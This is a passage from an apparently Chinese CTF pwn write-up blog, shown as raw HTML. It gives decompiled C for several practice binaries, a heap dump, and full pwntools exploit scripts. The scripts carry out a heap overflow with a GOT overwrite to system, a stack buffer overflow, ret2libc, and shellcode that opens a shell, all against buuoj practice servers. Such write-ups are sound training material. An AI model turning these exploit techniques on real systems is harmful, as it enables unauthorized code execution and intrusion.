class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size of description: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v2, &amp;v0);</span><br><span class="line">      add(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="keyword">delete</span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      display(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      update(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( byte_804B069 &gt; <span class="number">0x31</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;maximum capacity exceeded, bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">add</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">malloc</span>(a1);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, a1);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  *v3 = s;</span><br><span class="line">  *(&amp;ptr + byte_804B069) = v3;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">  input(*(&amp;ptr + byte_804B069) + <span class="number">4</span>, <span class="number">124</span>);</span><br><span class="line">  update(byte_804B069++);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add函数申请了两次，其中把第一次申请的空间写入了第二次申请的空间，第二次申请的空间大小是固定的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> * s;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0x7C</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; byte_804B069 &amp;&amp; (&amp;ptr)[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;ptr)[a1]);</span><br><span class="line">    <span class="built_in">free</span>((&amp;ptr)[a1]);</span><br><span class="line">    (&amp;ptr)[a1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;s</span><br></pre></td></tr></table></figure><p>free并赋值为0.</p><p>display：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">display</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; byte_804B069 &amp;&amp; *(&amp;ptr + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;name: %s\n&quot;</span>, *(&amp;ptr + a1) + <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;description: %s\n&quot;</span>, **(&amp;ptr + a1));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>update：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">update</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; byte_804B069 &amp;&amp; (&amp;ptr)[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v3, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (*(&amp;ptr)[a1] + v3) &gt;= (&amp;ptr)[a1] - <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    input(*(&amp;ptr)[a1], v3 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中update中的：<code>if ( (*(&amp;ptr)[a1] + v3) &gt;= (&amp;ptr)[a1] - 1 )</code>，这里的判断有一些问题，chunk0和chunk0(name)其实不一定相邻的，这样就有了溢出的可能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;aaaaa&quot;</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;ccccc&quot;</span>,<span class="string">&quot;ddddd&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80wx 0x804c000</span><br><span class="line">0x804c000:0x000000000x000000890x626262620x00000000 &lt;=chunk0</span><br><span class="line">0x804c010:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c020:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c030:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c040:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c050:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c060:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c070:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c080:0x000000000x000000000x000000000x00000089</span><br><span class="line">0x804c090:0x0804c0080x616161610x000000610x00000000 &lt;=chunk(0) name</span><br><span class="line">0x804c0a0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c0b0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c0c0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c0d0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c0e0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c0f0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c100:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c110:0x000000000x000000890x646464640x00000064</span><br><span class="line">0x804c120:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804c130:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure><p>对于chunk0来说就是0x80c008+输入长度是否大于0x804c08c。</p><p>倘若：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;aaaaa&quot;</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;ccccc&quot;</span>,<span class="string">&quot;ddddd&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;11111&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;aaaaa&quot;</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br></pre></td></tr></table></figure><p>这样的话，新申请的chunk3就会在chunk1和chunk2前面，而chunk3(name)则会在chunk1和chunk2的后面，这样就可以输入很长的数据了。</p><p>然后就是覆盖指针为free_got的地址，输出，计算system的地址。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#io = process(&quot;./babyfengshui_33c3_2016&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25098</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babyfengshui_33c3_2016&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,length,name,payload</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size of description: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">io.recvuntil(<span class="string">&quot;text: &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index,length,payload</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">io.recvuntil(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">io.recvuntil(<span class="string">&quot;text: &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&quot;naem&quot;</span>,<span class="string">&quot;ddddd&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*0x108+&quot;\x00&quot;*4+&quot;\x00\x00\x00\x89&quot;+&#x27;a&#x27;*0x80+&quot;\x00&quot;*4+&quot;\x00\x00\x00\x89&quot;+p32(elf.got[&#x27;free&#x27;])</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x198</span> + p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x19c</span>,<span class="string">&quot;name&quot;</span>,payload)</span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line">base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&quot;free&quot;,free_addr)</span></span><br><span class="line"><span class="comment">#libc_base=free_addr-libc.dump(&quot;free&quot;)</span></span><br><span class="line"><span class="comment">#sys_addr=libc_base+libc.dump(&quot;system&quot;)</span></span><br><span class="line">update(<span class="number">1</span>,<span class="number">0x4</span>,p32(sys_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2C-picoctf-2018-buffer-overflow-2"><a href="#0x2C-picoctf-2018-buffer-overflow-2" class="headerlink" title="0x2C.picoctf_2018_buffer overflow 2"></a>0x2C.picoctf_2018_buffer overflow 2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">win</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEF</span> &amp;&amp; a2 == <span class="number">0xDEADC0DE</span> )</span><br><span class="line">    result = (<span class="keyword">char</span> *)<span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跳转的win这个函数的时候两个参数需要是0xDEADBEEF 和 0xDEADC0DE</p><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#io = process(&quot;./PicoCTF_2018_buffer_overflow_2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27708</span>)</span><br><span class="line">win_addr = <span class="number">0x080485CB</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) +p32(win_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0xDEADBEEF</span>)+ p32(<span class="number">0xDEADC0DE</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2D-xdctf2015-pwn200"><a href="#0x2D-xdctf2015-pwn200" class="headerlink" title="0x2D.xdctf2015_pwn200"></a>0x2D.xdctf2015_pwn200</h2><p>简单的ret2libc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">112</span>]; <span class="comment">// [esp+0h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> *v6; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf[<span class="number">24</span>], <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  write(<span class="number">1</span>, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27296</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./bof&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">vuln = <span class="number">0x080484D6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(vuln)+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;\x21\x0a&quot;</span>)</span><br><span class="line">write_addr= u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line">base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) +p32(sys_addr)+ p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2E-mrctf2020-shellcode"><a href="#0x2E-mrctf2020-shellcode" class="headerlink" title="0x2E.mrctf2020_shellcode"></a>0x2E.mrctf2020_shellcode</h2><p>不能f5</p><p><img src="/2021/07/11/BUU-PWN-0x20-0x2F/image-20210712172029216.png" alt="image-20210712172029216"></p><p>直接写shellcode就OK。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26222</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;mrctf2020_shellcode&quot;)</span></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>要加：</p><p><code>context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)</code></p><h2 id="0x2F-bbys-tu-2016"><a href="#0x2F-bbys-tu-2016" class="headerlink" title="0x2F.bbys_tu_2016"></a>0x2F.bbys_tu_2016</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> 